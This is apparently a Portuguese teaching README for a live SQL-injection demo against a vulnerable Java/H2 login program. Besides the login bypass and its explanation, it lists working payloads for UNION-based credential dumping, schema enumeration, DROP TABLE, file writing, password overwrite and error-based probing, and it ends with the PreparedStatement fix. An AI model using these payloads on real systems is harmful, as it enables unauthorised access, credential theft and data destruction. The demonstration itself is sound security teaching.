# Demonstração

## SQL Injection ao vivo (com Java + H2 Database)

Objetivo: Mostrar como uma aplicação sem validação pode ser atacada.

## Demonstração:

1. Utilizar o código `SqlInjectionDemo.java`

2. Mostrar como um input malicioso (' OR '1'='1' --) faz o login com sucesso.

3. Em seguida, corrigir usando PreparedStatement e mostrar o ataque falhando.

## Como compilar:

- Compile o código com a biblioteca

```cli
javac -cp h2-2.3.232.jar SqlInjectionDemo.java
```
- Rode com a referencia à biblioteca

```cli
java -cp .;h2-2.3.232.jar SqlInjectionDemo
```

1. Demonstre o funcionamento

- Ao pedir usuario:

```cli
admin
```

- Ao pedir senha

```cli
1234
```

2. Demonstre o ataque

- Ao pedir usuario:

```cli
' OR '1'='1' --
```

- Ao pedir senha

Não insira senha, não é necessário, ou digite qualquercoisa.

### Explicação

1. O que a query faz?

    - A query final será:

```sql
SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='qualquercoisa'
```

onde:
- username='' → Sempre falso, porque não existe usuário vazio.
- OR '1'='1' → Sempre verdadeiro, porque 1 é igual a 1.
- -- → Comentário em SQL: ignora o resto da linha (o AND password e tudo depois).

    - Seria a mesma coisa que:

```sql
SELECT * FROM users WHERE TRUE
```

    - Imagine que façamos:

```sql
' OR '1'='1'; DROP TABLE users; --
```

# SQL INJECTION Options

## Usando UNION para injetar dados falsos
' UNION SELECT 1,'admin','pwned'--

## Listar todos os usuários
' UNION SELECT id, username, password FROM users--

## Extrair versão do H2
' UNION SELECT 1, version(), user()--

## Listar todas as tabelas do schema PUBLIC
' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC'--

## Listar colunas de uma tabela específica
' UNION SELECT 1, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='USERS'--

## Listar todos os schemas disponíveis
' UNION SELECT 1, SCHEMA_NAME, null FROM INFORMATION_SCHEMA.SCHEMATA--

## Criar uma nova tabela maliciosa (se o usuário tiver privilégios)
'; CREATE TABLE hack(id INT, data VARCHAR(100)); INSERT INTO hack VALUES(1, 'pwned')--

## Usar função FILE_WRITE para escrever arquivo (requer permissões)
'; CALL FILE_WRITE('/tmp/pwned.txt', 'H2 SQL Injection Demo')--

## UPDATE/DELETE Modificar dados
'; UPDATE users SET password='hacked' WHERE username='admin'--

## ERRORS
' AND SELECT--
ERRO SQL: Unexpected end of statement
' AND NONEXISTENT_FUNCTION()--
ERRO SQL: Function "NONEXISTENT_FUNCTION" not found

' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1/(SELECT COUNT(*) FROM users)-1--
' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
' AND '1'=(SELECT table_name FROM information_schema.tables LIMIT 1)--

# Forma segura
String sqlSeguro = "SELECT * FROM users WHERE username=? AND password=?";
PreparedStatement pstmt = conn.prepareStatement(sqlSeguro);
pstmt.setString(1, user);
pstmt.setString(2, pass);
ResultSet rs = pstmt.executeQuery();